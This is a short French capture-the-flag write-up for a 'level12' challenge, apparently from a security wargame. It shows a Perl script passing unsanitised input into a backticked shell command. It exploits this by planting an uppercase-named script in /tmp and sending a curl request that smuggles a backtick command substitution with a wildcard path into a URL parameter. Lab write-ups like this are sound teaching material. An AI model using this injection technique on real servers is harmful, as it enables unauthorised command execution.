En lisant le code de `level12.pl` on retrouve la ligne suivante:

@output = `egrep "^$xx" /tmp/xd 2>&1`;


Il est possible de faire une injection sur cette commande, mais l'input $xx a ete capitalize. On peut alors faire un script `EXPLOIT` que l'on mettra dans /tmp

```sh
#!/bin/sh

getflag > /tmp/flag
```

puis on fait: 

```sh
chmod 777 /tmp/EXPLOIT
```

et finalment l'injection:

```sh
curl 'http://localhost:4646/?x=`/*/EXPLOIT`'
```

